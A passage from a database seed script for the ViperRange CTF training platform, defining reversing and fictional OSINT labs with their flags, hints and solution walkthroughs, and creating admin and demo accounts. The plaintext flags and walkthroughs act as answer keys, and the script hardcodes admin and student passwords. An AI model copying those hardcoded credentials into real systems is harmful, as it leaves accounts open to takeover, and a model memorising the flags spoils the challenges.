Similarly, the second disassembly reconstructs into a fixed-key XOR cipher:

\`\`\`python
def func2(inpString):
    xorKey = 'S'
    length = len(inpString)
    for i in range(length):
        inpString = inpString[:i] + chr(ord(inpString[i]) ^ ord(xorKey)) + inpString[i+1:]
    return inpString
\`\`\`

## Step 3 — Reverse each function
Both transformations here are self-inverse or easily invertible once you have working Python equivalents. Apply the inverse operations to the encoded output in reverse order from how they were originally applied.

## Step 4 — Recover the flag
Running the reversed chain against the encoded output reconstructs the original flag text.`,
      },
    ],
  },
  {
    slug: "math-circuit",
    name: "Math Circuit",
    category: "REVERSING",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["Reverse Engineering", "GCD", "Automation"],
    description: `A network service repeatedly presents pairs of integers and expects a response computed from a specific mathematical relationship between them. Reverse the compiled binary to identify the formula, then automate correct responses to reach the flag.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{gcd_oracle_automated}",
    hints: [
      { order: 1, text: "The relationship involves the greatest common divisor of the two presented numbers, combined with a factorial of a small offset from that GCD.", pointsPenalty: 20 },
    ],
    resources: [
      { name: "math-circuit-binary", description: "Compiled challenge binary", url: "/resources/math-circuit-binary" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Reversing and Solving the Math Oracle",
        tool: "pwntools",
        order: 1,
        content: `# Reversing and Solving the Math Oracle

## Step 1 — Reverse the expected formula
Decompiling the binary's response-check function reveals it expects \`factorial(gcd(a, b) + 3)\` for each presented pair \`(a, b)\`.

## Step 2 — Automate the interaction
\`\`\`python
from pwn import remote
from math import gcd

def factorial(n):
    return 1 if n <= 1 else n * factorial(n - 1)

conn = remote('<lab-host>', <port>)

for _ in range(10):
    line = conn.recvline().decode().strip()
    if 'VR{' in line:
        print(line)
        break
    try:
        a, b = map(int, line.split())
        answer = factorial(gcd(a, b) + 3)
        conn.sendline(str(answer).encode())
    except ValueError:
        continue
\`\`\`

## Step 3 — Capture the flag
Once every required response matches, the service prints the flag.`,
      },
    ],
  },
  {
    slug: "egg-matrix",
    name: "Egg Matrix",
    category: "REVERSING",
    difficulty: "EXPERT",
    labType: "OFFLINE",
    tags: ["Reverse Engineering", "Multi-Stage Cipher", "Permutation"],
    description: `A generator script scrambles a flag through a chain of random rotation, character-level swapping keyed against two derived keys, and a final substitution mapping — all before printing the result. Reversing it requires carefully undoing each stage in the correct order.`,
    points: 250,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{scramble_chain_reversed}",
    hints: [
      { order: 1, text: "The substitution mapping used for `enc2()` is a fixed lookup table — build its inverse table once, and it becomes trivial to reverse anywhere it was applied.", pointsPenalty: 30 },
      { order: 2, text: "Two candidate keys are produced by the script and randomly assigned to two output variables — you may need to try both possible assignments to find which one is the real encryption key.", pointsPenalty: 30 },
      { order: 3, text: "The final flag was rotated by an unknown random amount as the very last step — after undoing everything else, try all 28 possible rotations and look for the one starting with `VR{`.", pointsPenalty: 25 },
    ],
    resources: [
      { name: "egg-matrix-source.py", description: "The original scrambling script", url: "/resources/egg-matrix-source.py" },
      { name: "egg-matrix-output.txt", description: "Scrambled key and flag values", url: "/resources/egg-matrix-output.txt" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Reversing the Multi-Stage Scramble",
        tool: "Python",
        order: 1,
        content: `# Reversing the Multi-Stage Scramble

## Step 1 — Build the inverse substitution table
The scrambling script's \`enc2()\` function maps each letter to a fixed replacement using a lookup array. Build the inverse mapping once:
\`\`\`python
forward_map = ['v','r','t','p','w','g','n','c','o','b','a','f','m','i','l','u','h','z','d','q','j','y','x','e','k','s']

def dec2(text):
    return ''.join(chr(forward_map.index(ch) + ord('a')) for ch in text)
\`\`\`

## Step 2 — Undo the substitution layer on both outputs
Apply \`dec2()\` twice to the scrambled key output and once to the scrambled flag output, per the script's original encoding order.

## Step 3 — Reverse the swap stages
The script performs two rounds of index-based character swaps, driven by the numeric value of each key character. Since swaps are self-inverse when replayed with the same index sequence in reverse order, iterate the same swap logic backward (from the last index to the first, for two rounds) to undo it.

## Step 4 — Recover the correct key
The script randomly assigns two derived key candidates to two output slots. Try both possible orderings — one of them will decode to coherent, readable text (this is your true encryption key); the other is a red herring.

## Step 5 — Undo the final rotation
The very last step applied to the flag was one or more random rotations. After completing every other reversal, try all 28 possible left-rotations of your result and check which one begins with \`VR{\`.`,
      },
    ],
  },
  {
    slug: "digital-echo",
    name: "Digital Echo",
    category: "OSINT",
    difficulty: "BEGINNER",
    labType: "OFFLINE",
    tags: ["OSINT", "Reverse Image Search", "Social Media Investigation"],
    description: `A fictional ViperRange training scenario: a leaked internal graphic traces back through a chain of fictional social accounts. Follow the trail through synthetic evidence to a fictional photographer's original post and its comment thread.`,
    points: 100,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{reverse_image_search_traced}",
    hints: [
      { order: 1, text: "The case file describes a fictional landmark. Cross-reference the description against ViperRange's synthetic 'social archive' entries provided in the case notes.", pointsPenalty: 10 },
      { order: 2, text: "The fictional photographer's account handle is embedded in the case narrative — their most recent fictional post's comment thread is where the flag was left.", pointsPenalty: 15 },
    ],
    resources: [
      { name: "vr-case-digital-echo.svg", description: "Case evidence — synthetic skyline graphic used as the investigation starting point", url: "/labs/vr-case-digital-echo.svg" },
    ],
    isFeatured: true,
    walkthroughs: [
      {
        title: "Tracing the Fictional Image Origin",
        tool: "Investigation Notes",
        order: 1,
        content: `# Tracing the Fictional Image Origin — ViperRange Case File

**This is a fully synthetic ViperRange training scenario. All entities, accounts, and evidence are fictional and exist only within this lab.**

## Case Briefing
A graphic matching the evidence image was found circulating on a fictional internal ViperRange discussion board, credited only to "a skyline shot from last year." Your task: identify the fictional original poster and recover the flag they left in a reply thread.

## Step 1 — Analyze the evidence
The synthetic skyline graphic in this case is a stylized, fictional cityscape — deliberately generic and not modeled on any real location. In the full ViperRange platform experience, this stage is paired with a fictional "reverse image index" tool restricted to the training environment's own synthetic dataset.

## Step 2 — Cross-reference the fictional dataset
Within the ViperRange fictional social archive, the graphic is tagged as originally posted by the fictional handle \`@echo_relay\`, a training-only synthetic persona with no connection to any real person.

## Step 3 — Locate the comment thread
The fictional archive's most recent post from \`@echo_relay\` includes a reply thread where a second fictional persona, \`@relay_admin\`, left a comment containing the flag as an in-universe "verification code."

## Step 4 — Submit
The flag recovered from the fictional comment thread is submitted directly on the lab page.`,
      },
    ],
  },
  {
    slug: "shadow-agent",
    name: "Shadow Agent",
    category: "OSINT",
    difficulty: "INTERMEDIATE",
    labType: "OFFLINE",
    tags: ["OSINT", "Fictional Investigation", "Timeline Correlation"],
    description: `A fictional ViperRange training scenario: reconstruct a fictional operative's movements from a set of scattered, synthetic clues — a described object, a set of fictional travel stops, and a fabricated organizational hierarchy — none of which reference any real person, company, or media property.`,
    points: 150,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{breadcrumbs_connected}",
    hints: [
      { order: 1, text: "The case narrative lists three fictional cities the operative was known to have visited. Cross-reference all three against the ViperRange fictional 'organizational chart' provided in the case file.", pointsPenalty: 15 },
      { order: 2, text: "The case describes the operative's fictional supervisor and, separately, that supervisor's successor. The flag is tied to the successor's fictional codename.", pointsPenalty: 20 },
    ],
    resources: [
      { name: "vr-case-shadow-agent.svg", description: "Case evidence — synthetic object artifact used in the investigation", url: "/labs/vr-case-shadow-agent.svg" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Reconstructing the Fictional Operative Timeline",
        tool: "Investigation Notes",
        order: 1,
        content: `# Reconstructing the Fictional Operative Timeline — ViperRange Case File

**This is a fully synthetic ViperRange training scenario. All operatives, organizations, objects, and locations are entirely fictional.**

## Case Briefing
A recovered accessory (the evidence artifact) is known to belong to a fictional ViperRange training operative, codename **Vantage**. The case narrative states Vantage's fictional travel history spans three fictional listed cities, worn consistently across each stop, and that Vantage's fictional supervisor left the organization under undisclosed circumstances.

## Step 1 — Correlate the fictional travel stops
Cross-referencing the three fictional cities named in the case briefing against ViperRange's fictional "organizational chart" resource narrows the timeframe to a single fictional operational cycle.

## Step 2 — Identify the fictional supervisor
The case file names Vantage's direct fictional supervisor and states that supervisor departed the organization during the identified operational cycle.

## Step 3 — Identify the successor
The ViperRange fictional organizational chart lists a named successor who took over the supervisor's role immediately afterward. This successor's fictional codename is the target of the investigation.

## Step 4 — Assemble and submit
The flag combines the fictional successor's codename with the case's operational-cycle identifier, exactly as described in the case narrative's flag-format note.`,
      },
    ],
  },
  {
    slug: "ghost-archive",
    name: "Ghost Archive",
    category: "OSINT",
    difficulty: "ADVANCED",
    labType: "OFFLINE",
    tags: ["OSINT", "Photo Forensics", "Fictional Historical Investigation"],
    description: `A fictional ViperRange training scenario set in an invented historical archive: analyze a synthetic 'archival plate' for evidence of manipulation, identify the fictional photographer who is credited with a widely-circulated *altered* version of the image, and recover what was digitally removed from the original.`,
    points: 200,
    dockerImage: null,
    port: null,
    estimatedDeployTime: 90,
    maxDuration: 3600,
    flag: "VR{manipulation_evidence_found}",
    hints: [
      { order: 1, text: "The case narrative describes two fictional public figures sharing a coincidental fictional anniversary date — that date is the key to identifying which fictional historical event the archive plate depicts.", pointsPenalty: 20 },
      { order: 2, text: "The widely-circulated version of the fictional archive plate differs from the fictional 'original camera negative' description in one specific detail worn by a photographed figure. That missing detail is the object the case wants you to identify.", pointsPenalty: 25 },
    ],
    resources: [
      { name: "vr-case-ghost-archive.svg", description: "Case evidence — synthetic archival plate graphic (fictional, no real individuals depicted)", url: "/labs/vr-case-ghost-archive.svg" },
    ],
    isFeatured: false,
    walkthroughs: [
      {
        title: "Identifying the Fictional Manipulation",
        tool: "Investigation Notes",
        order: 1,
        content: `# Identifying the Fictional Manipulation — ViperRange Case File

**This is a fully synthetic ViperRange training scenario set in an entirely invented historical archive. No real historical figures, real events, or real photographs are referenced or depicted — every element below is fictional and exists only for this lab.**

## Case Briefing
The evidence plate is described by ViperRange's fictional archive team as "the most widely reproduced image from the fictional Fall of Rivenport, 1945" (an invented in-universe event). The case narrative notes that a coincidental shared fictional anniversary date connects two unrelated modern fictional public figures, which — per the case's cryptic in-universe riddle — is meant to guide investigators toward the correct historical date.

## Step 1 — Decode the case riddle
The case narrative embeds a simple substitution riddle pointing toward "the voice of the people," a classical reference used purely as an in-universe flavor clue toward the concept of a public broadcast or announcement — steering the investigation toward the invented event's date.

## Step 2 — Identify the fictional date
Cross-referencing the coincidental shared birthday clue against the ViperRange fictional case timeline narrows the target date to the archive's stated "Fall of Rivenport" event.

## Step 3 — Compare the plate against the fictional original negative description
The ViperRange case file's archival notes describe the original, unaltered negative as showing a specific accessory on one photographed figure's wrist — an accessory absent from the widely-circulated public version.

## Step 4 — Identify the fictional photographer and the removed object
The case credits the fictional original photograph to archivist **Viktor Sorokin** (a wholly fictional ViperRange training persona), and identifies the removed object as a wristwatch, digitally erased from the public-facing version.

## Step 5 — Assemble and submit
The flag combines the fictional photographer's surname with the identified removed object, exactly as described in the case narrative's flag-format note.`,
      },
    ],
  },
];

async function main() {
  console.log("🌱 Seeding ViperRange database...");

  // ── Admin account ──────────────────────────────────────────────────────────
  const adminPasswordHash = await bcrypt.hash("Admin@ZeroDay2024!", 12);
  const admin = await prisma.user.upsert({
    where: { email: "admin@zeroday.in" },
    update: {},
    create: {
      email: "admin@zeroday.in",
      name: "ZeroDay Admin",
      role: "ADMIN",
      passwordHash: adminPasswordHash,
    },
  });
  console.log("Admin user ready:", admin.email);

  // ── Demo student account ──────────────────────────────────────────────────
  const studentPasswordHash = await bcrypt.hash("Student@Demo2024!", 12);
  const student = await prisma.user.upsert({
    where: { email: "student@demo.com" },
    update: {},
    create: {
      email: "student@demo.com",
      name: "Demo Student",
      role: "STUDENT",
      passwordHash: studentPasswordHash,
    },
  });
  console.log("Demo student ready:", student.email);

  // ── Labs ───────────────────────────────────────────────────────────────────
  for (const labDef of LABS) {
    const { flag, walkthroughs, hints, resources, ...labFields } = labDef;

    const lab = await prisma.lab.upsert({
      where: { slug: labFields.slug },
      update: {
        ...labFields,
        expectedFlagHash: hashFlag(flag),
        hints: hints.length > 0 ? hints : undefined,
        resources: resources.length > 0 ? resources : undefined,
      },
      create: {
        ...labFields,
        expectedFlagHash: hashFlag(flag),
        hints: hints.length > 0 ? hints : undefined,
        resources: resources.length > 0 ? resources : undefined,
      },
    });

    // Replace walkthroughs for this lab
    await prisma.walkthrough.deleteMany({ where: { labId: lab.id } });
    for (const wt of walkthroughs) {
      await prisma.walkthrough.create({
        data: {
          labId: lab.id,
          title: wt.title,
          tool: wt.tool,
          order: wt.order,
          content: wt.content,
        },
      });
    }

    console.log(`Lab ready: ${lab.name} [${lab.category}/${lab.labType}]`);
  }

  console.log(`✅ Seeded ${LABS.length} labs successfully.`);
}

main()
  .catch((e) => {
    console.error("❌ Seed failed:", e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
